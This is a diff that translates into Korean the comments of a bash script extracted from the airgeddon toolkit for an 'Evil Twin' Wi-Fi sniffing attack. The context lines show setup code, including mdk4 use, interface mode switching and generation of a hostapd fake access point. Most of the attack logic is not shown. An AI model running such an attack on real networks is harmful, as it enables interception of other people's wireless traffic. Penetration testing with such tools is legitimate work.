@@ -2,11 +2,11 @@
 #shellcheck disable=SC2154,SC2034
 
 # ============================================================
-# Evil Twin Sniffing Attack - Standalone Script
-# Extracted from wfast.sh (airgeddon)
+# Evil Twin Sniffing Attack - 단독 실행 스크립트
+# wfast.sh (airgeddon)에서 추출
 # ============================================================
 
-# --- Load config file ---
+# --- 설정 파일 로드 ---
 _config_file="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/et_config.conf"
 if [ ! -f "${_config_file}" ]; then
 	echo "[!] Config file not found: ${_config_file}" >&2
@@ -18,7 +18,7 @@ fi
 # tr -d '\r'로 \r을 제거한 뒤 소싱하면 어떤 OS에서 편집해도 정상 동작.
 source <(tr -d '\r' < "${_config_file}")
 
-# --- Internal fixed values (do not modify via config file) ---
+# --- 내부 고정값 (설정 파일로 수정 불가) ---
 mdk_command="mdk4"
 check_kill_needed=1
 interface_airmon_compatible=1
@@ -28,7 +28,7 @@ right_arping=0
 right_arping_command="arping"
 able_to_play_sounds=0
 
-# --- Internal constants ---
+# --- 내부 상수 ---
 et_mode="et_sniffing"
 AIRGEDDON_WINDOWS_HANDLING="${AIRGEDDON_WINDOWS_HANDLING:-xterm}"
 AIRGEDDON_DEBUG_MODE="${AIRGEDDON_DEBUG_MODE:-false}"
@@ -129,11 +129,11 @@ dos_pursuit_mode_scan_pid=""
 et_process_control_window=""
 enterprise_process_control_window=""
 
-# language_strings stub (no actual output)
+# language_strings 스텁 (실제 출력 없음)
 function language_strings() { :; }
 
 # ============================================================
-# Helper functions
+# 헬퍼 함수
 # ============================================================
 
 function detect_distro_window_ratios() {
@@ -1303,7 +1303,7 @@ function restore_et_interface() {
 }
 
 # ============================================================
-# Main function
+# 메인 함수
 # ============================================================
 
 function _et_cleanup() {
@@ -1332,14 +1332,14 @@ function exec_et_sniffing_attack() {
 	debug_print
 	trap '_et_cleanup' SIGINT SIGTERM
 
-	# Ensure interface is in managed mode and up before hostapd
+	# hostapd 실행 전 인터페이스를 managed 모드로 설정
 	echo "[*] Setting ${interface} to managed mode..."
 	ip link set "${interface}" down > /dev/null 2>&1
 	iw "${interface}" set type managed > /dev/null 2>&1
 	ip link set "${interface}" up > /dev/null 2>&1
 	echo "[+] Interface ready."
 
-	# Write channel file for control window display
+	# 컨트롤 창 표시를 위해 채널 파일 작성
 	echo "${channel}" > "${tmpdir}${channelfile}"
 
 	echo "[*] Generating hostapd config (Fake AP: ${essid} on ch${channel})..."
@@ -1377,7 +1377,7 @@ function exec_et_sniffing_attack() {
 }
 
 # ============================================================
-# Pre-run validation
+# 실행 전 검증
 # ============================================================
 
 echo "[*] Starting Evil Twin Sniffing Attack..."
